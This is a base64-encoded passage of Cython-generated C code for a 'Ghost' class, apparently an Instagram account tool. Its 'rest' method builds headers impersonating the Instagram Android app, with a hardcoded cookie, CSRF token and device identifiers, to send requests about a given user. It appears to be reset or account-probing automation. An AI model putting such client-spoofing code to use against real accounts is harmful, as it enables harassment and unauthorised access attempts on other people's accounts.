ICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE5KTsKICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMjApOwogICAgICAgICAgX19QeXhfRXJyUmVzdG9yZShfX3B5eF90XzE4LCBfX3B5eF90XzE5LCBfX3B5eF90XzIwKTsKICAgICAgICAgIF9fcHl4X3RfMTggPSAwOyBfX3B5eF90XzE5ID0gMDsgX19weXhfdF8yMCA9IDA7IF9fcHl4X3RfMjEgPSAwOyBfX3B5eF90XzIyID0gMDsgX19weXhfdF8yMyA9IDA7CiAgICAgICAgICBfX3B5eF9saW5lbm8gPSBfX3B5eF90XzE1OyBfX3B5eF9jbGluZW5vID0gX19weXhfdF8xNjsgX19weXhfZmlsZW5hbWUgPSBfX3B5eF90XzE3OwogICAgICAgICAgZ290byBfX3B5eF9MNV9leGNlcHRfZXJyb3I7CiAgICAgICAgfQogICAgICAgIF9fcHl4X0wxOTo7CiAgICAgIH0KICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICBnb3RvIF9fcHl4X0w0X2V4Y2VwdGlvbl9oYW5kbGVkOwogICAgfQogICAgZ290byBfX3B5eF9MNV9leGNlcHRfZXJyb3I7CgogICAgCiAgICBfX3B5eF9MNV9leGNlcHRfZXJyb3I6OwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMik7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzMpOwogICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzIsIF9fcHl4X3RfMyk7CiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yOwogICAgX19weXhfTDRfZXhjZXB0aW9uX2hhbmRsZWQ6OwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMik7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzMpOwogICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzIsIF9fcHl4X3RfMyk7CiAgICBfX3B5eF9MOF90cnlfZW5kOjsKICB9CgogIAoKICAKICBfX3B5eF9yID0gUHlfTm9uZTsgX19QeXhfSU5DUkVGKFB5X05vbmUpOwogIGdvdG8gX19weXhfTDA7CiAgX19weXhfTDFfZXJyb3I6OwogIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEzKTsKICBfX1B5eF9BZGRUcmFjZWJhY2soInRmLkdob3N0LmNoZWNrIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgX19weXhfciA9IE5VTEw7CiAgX19weXhfTDA6OwogIF9fUHl4X1hERUNSRUYoX19weXhfdl91YSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2Rldik7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2RldmljZV9pZCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3V1aSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2hlYWRlcnMpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9kYXRhKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfcmVzcG9uc2UpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl91c2VybmFtZSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2ZvbGxvd2VyX2NvdW50KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZSk7CiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIF9fcHl4X3I7Cn0KCgoKCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMnRmXzVHaG9zdF8xN3Jlc3QoUHlPYmplY3QgKl9fcHl4X3NlbGYsIAojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZWxzZQpQeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2VuZGlmCik7IApzdGF0aWMgUHlNZXRob2REZWYgX19weXhfbWRlZl8ydGZfNUdob3N0XzE3cmVzdCA9IHsicmVzdCIsIChQeUNGdW5jdGlvbikodm9pZCgqKSh2b2lkKSkoX19QeXhfUHlDRnVuY3Rpb25fRmFzdENhbGxXaXRoS2V5d29yZHMpX19weXhfcHdfMnRmXzVHaG9zdF8xN3Jlc3QsIF9fUHl4X01FVEhfRkFTVENBTEx8TUVUSF9LRVlXT1JEUywgMH07CnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMnRmXzVHaG9zdF8xN3Jlc3QoUHlPYmplY3QgKl9fcHl4X3NlbGYsIAojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZWxzZQpQeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2VuZGlmCikgewogIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZiA9IDA7CiAgUHlPYmplY3QgKl9fcHl4X3ZfdXNlciA9IDA7CiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTAogIENZVEhPTl9VTlVTRUQgUHlfc3NpemVfdCBfX3B5eF9uYXJnczsKICAjZW5kaWYKICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7CiAgUHlPYmplY3QqIHZhbHVlc1syXSA9IHswLDB9OwogIGludCBfX3B5eF9saW5lbm8gPSAwOwogIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDsKICBpbnQgX19weXhfY2xpbmVubyA9IDA7CiAgUHlPYmplY3QgKl9fcHl4X3IgPSAwOwogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoInJlc3QgKHdyYXBwZXIpIiwgMCk7CiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTAogICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogIF9fcHl4X25hcmdzID0gUHlUdXBsZV9HRVRfU0laRShfX3B5eF9hcmdzKTsKICAjZWxzZQogIF9fcHl4X25hcmdzID0gUHlUdXBsZV9TaXplKF9fcHl4X2FyZ3MpOyBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgPCAwKSkgcmV0dXJuIE5VTEw7CiAgI2VuZGlmCiAgI2VuZGlmCiAgX19weXhfa3d2YWx1ZXMgPSBfX1B5eF9Ld1ZhbHVlc19GQVNUQ0FMTChfX3B5eF9hcmdzLCBfX3B5eF9uYXJncyk7CiAgewogICAgUHlPYmplY3QgKiogY29uc3QgX19weXhfcHlhcmduYW1lc1tdID0geyZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2VsZiwmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3VzZXIsMH07CiAgICBjb25zdCBQeV9zc2l6ZV90IF9fcHl4X2t3ZHNfbGVuID0gKF9fcHl4X2t3ZHMpID8gX19QeXhfTnVtS3dhcmdzX0ZBU1RDQUxMKF9fcHl4X2t3ZHMpIDogMDsKICAgIGlmICh1bmxpa2VseShfX3B5eF9rd2RzX2xlbikgPCAwKSBfX1BZWF9FUlIoMCwgMjI5LCBfX3B5eF9MM19lcnJvcikKICAgIGlmIChfX3B5eF9rd2RzX2xlbiA+IDApIHsKICAgICAgc3dpdGNoIChfX3B5eF9uYXJncykgewogICAgICAgIGNhc2UgIDI6CiAgICAgICAgdmFsdWVzWzFdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDEpOwogICAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzFdKSkgX19QWVhfRVJSKDAsIDIyOSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIOwogICAgICAgIGNhc2UgIDE6CiAgICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApOwogICAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDIyOSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIOwogICAgICAgIGNhc2UgIDA6IGJyZWFrOwogICAgICAgIGRlZmF1bHQ6IGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7CiAgICAgIH0KICAgICAgY29uc3QgUHlfc3NpemVfdCBrd2RfcG9zX2FyZ3MgPSBfX3B5eF9uYXJnczsKICAgICAgaWYgKF9fUHl4X1BhcnNlS2V5d29yZHMoX19weXhfa3dkcywgX19weXhfa3d2YWx1ZXMsIF9fcHl4X3B5YXJnbmFtZXMsIDAsIHZhbHVlcywga3dkX3Bvc19hcmdzLCBfX3B5eF9rd2RzX2xlbiwgInJlc3QiLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDIyOSwgX19weXhfTDNfZXJyb3IpCiAgICAgIGZvciAoUHlfc3NpemVfdCBpID0gX19weXhfbmFyZ3M7IGkgPCAyOyBpKyspIHsKICAgICAgICBpZiAodW5saWtlbHkoIXZhbHVlc1tpXSkpIHsgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoInJlc3QiLCAxLCAyLCAyLCBpKTsgX19QWVhfRVJSKDAsIDIyOSwgX19weXhfTDNfZXJyb3IpIH0KICAgICAgfQogICAgfSBlbHNlIGlmICh1bmxpa2VseShfX3B5eF9uYXJncyAhPSAyKSkgewogICAgICBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOwogICAgfSBlbHNlIHsKICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApOwogICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAyMjksIF9fcHl4X0wzX2Vycm9yKQogICAgICB2YWx1ZXNbMV0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMSk7CiAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzFdKSkgX19QWVhfRVJSKDAsIDIyOSwgX19weXhfTDNfZXJyb3IpCiAgICB9CiAgICBfX3B5eF92X3NlbGYgPSB2YWx1ZXNbMF07CiAgICBfX3B5eF92X3VzZXIgPSB2YWx1ZXNbMV07CiAgfQogIGdvdG8gX19weXhfTDZfc2tpcDsKICBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjo7CiAgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoInJlc3QiLCAxLCAyLCAyLCBfX3B5eF9uYXJncyk7IF9fUFlYX0VSUigwLCAyMjksIF9fcHl4X0wzX2Vycm9yKQogIF9fcHl4X0w2X3NraXA6OwogIGdvdG8gX19weXhfTDRfYXJndW1lbnRfdW5wYWNraW5nX2RvbmU7CiAgX19weXhfTDNfZXJyb3I6OwogIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHsKICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTsKICB9CiAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0Zi5HaG9zdC5yZXN0IiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIE5VTEw7CiAgX19weXhfTDRfYXJndW1lbnRfdW5wYWNraW5nX2RvbmU6OwogIF9fcHl4X3IgPSBfX3B5eF9wZl8ydGZfNUdob3N0XzE2cmVzdChfX3B5eF9zZWxmLCBfX3B5eF92X3NlbGYsIF9fcHl4X3ZfdXNlcik7CgogIAogIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHsKICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTsKICB9CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIF9fcHl4X3I7Cn0KCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMnRmXzVHaG9zdF8xNnJlc3QoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfdl9zZWxmLCBQeU9iamVjdCAqX19weXhfdl91c2VyKSB7CiAgUHlPYmplY3QgKl9fcHl4X3ZfaGVhZGVycyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfZGF0YSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfcmVzcG9uc2UgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X3IgPSBOVUxMOwogIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3ZfZSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMOwogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgUHlPYmplY3QgKl9fcHl4X3RfMSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfNCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfNSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfNiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfNyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfOCA9IE5VTEw7CiAgc2l6ZV90IF9fcHl4X3RfOTsKICBpbnQgX19weXhfdF8xMDsKICBQeU9iamVjdCAqX19weXhfdF8xMSA9IE5VTEw7CiAgaW50IF9fcHl4X3RfMTI7CiAgY2hhciBjb25zdCAqX19weXhfdF8xMzsKICBQeU9iamVjdCAqX19weXhfdF8xNCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTUgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzE2ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xNyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTggPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzE5ID0gTlVMTDsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJyZXN0IiwgMCk7CgogIAogIHsKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfMSwgJl9fcHl4X3RfMiwgJl9fcHl4X3RfMyk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7CiAgICAgewoKICAgICAgCiAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgxOCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDIzMiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1hfUGlnZW9uX1Nlc3Npb25fSWQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfNTBjYzY4NjFfNzAzNl80M2I0XzgwMmVfZmI0MjgyNzkpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjMyLCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9YX1BpZ2Vvbl9SYXdjbGllbnR0aW1lLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzE3MDAyNTE1NzRfOTgyKSA8ICgwKSkgX19QWVhfRVJSKDAsIDIzMiwgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfWF9JR19Db25uZWN0aW9uX1NwZWVkLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzFrYnBzKSA8ICgwKSkgX19QWVhfRVJSKDAsIDIzMiwgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfWF9JR19CYW5kd2lkdGhfU3BlZWRfS0JQUywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8xXzAwMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAyMzIsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1hfSUdfQmFuZHdpZHRoX1RvdGFsQnl0ZXNfQiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8wKSA8ICgwKSkgX19QWVhfRVJSKDAsIDIzMiwgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfWF9JR19CYW5kd2lkdGhfVG90YWxUaW1lX01TLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzApIDwgKDApKSBfX1BZWF9FUlIoMCwgMjMyLCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9YX0Jsb2tzX1ZlcnNpb25fSWQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jODBjNWZiMzBkZmFlOWUyNzNlNDAwOWYwM2IxODI4MCkgPCAoMCkpIF9fUFlYX0VSUigwLCAyMzIsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1hfSUdfQ29ubmVjdGlvbl9UeXBlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfV0lGSSkgPCAoMCkpIF9fUFlYX0VSUigwLCAyMzIsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1hfSUdfQ2FwYWJpbGl0aWVzLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzNiclR2dykgPCAoMCkpIF9fUFlYX0VSUigwLCAyMzIsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1hfSUdfQXBwX0lELCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzU2NzA2NzM0MzM1MjQyNykgPCAoMCkpIF9fUFlYX0VSUigwLCAyMzIsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1VzZXJfQWdlbnQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfSW5zdGFncmFtXzEwMF8wXzBfMTdfMTI5X0FuZHJvaWQpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjMyLCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9BY2NlcHRfTGFuZ3VhZ2UsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZW5fR0JfZW5fVVMpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjMyLCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0Nvb2tpZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9taWRfWlZmR3ZnQUJBQUdvUXFhN0FZM21nb1lCVjFuUCkgPCAoMCkpIF9fUFlYX0VSUigwLCAyMzIsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0NvbnRlbnRfVHlwZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hcHBsaWNhdGlvbl94X3d3d19mb3JtX3VybGVuY29kZV8yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDIzMiwgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfQWNjZXB0X0VuY29kaW5nLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2d6aXBfZGVmbGF0ZSkgPCAoMCkpIF9fUFlYX0VSUigwLCAyMzIsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfSG9zdCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9pX2luc3RhZ3JhbV9jb20pIDwgKDApKSBfX1BZWF9FUlIoMCwgMjMyLCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9YX0ZCX0hUVFBfRW5naW5lLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfTGlnZXIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjMyLCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0Nvbm5lY3Rpb24sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3Vfa2VlcF9hbGl2ZSkgPCAoMCkpIF9fUFlYX0VSUigwLCAyMzIsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX3B5eF92X2hlYWRlcnMgPSAoKFB5T2JqZWN0KilfX3B5eF90XzQpOwogICAgICBfX3B5eF90XzQgPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjUyLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CgogICAgICAKICAgICAgX19weXhfdF82ID0gTlVMTDsKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9qc29uKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMjUzLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZHVtcHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAyNTMsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CgogICAgICAKICAgICAgX19weXhfdF83ID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAyNTQsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NzcmZ0b2tlbiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV85eTNONWtMcXppYWxRQTd6OTZBTWl5QUtMTUJXcHFWaikgPCAoMCkpIF9fUFlYX0VSUigwLCAyNTQsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYWRpZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8wZGZhZjgyMF8yNzQ4XzQ2MzRfOTM2NV9jM2Q4YzgwMSkgPCAoMCkpIF9fUFlYX0VSUigwLCAyNTQsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ3VpZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8xZjc4NDQzMV8yNjYzXzRkYjlfYjYyNF84NmJkOWNlMSkgPCAoMCkpIF9fUFlYX0VSUigwLCAyNTQsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZGV2aWNlX2lkLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2FuZHJvaWRfYjkzZGRiMzdlOTgzNDgxYykgPCAoMCkpIF9fUFlYX0VSUigwLCAyNTQsIF9fcHl4X0wzX2Vycm9yKQoKICAgICAgCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9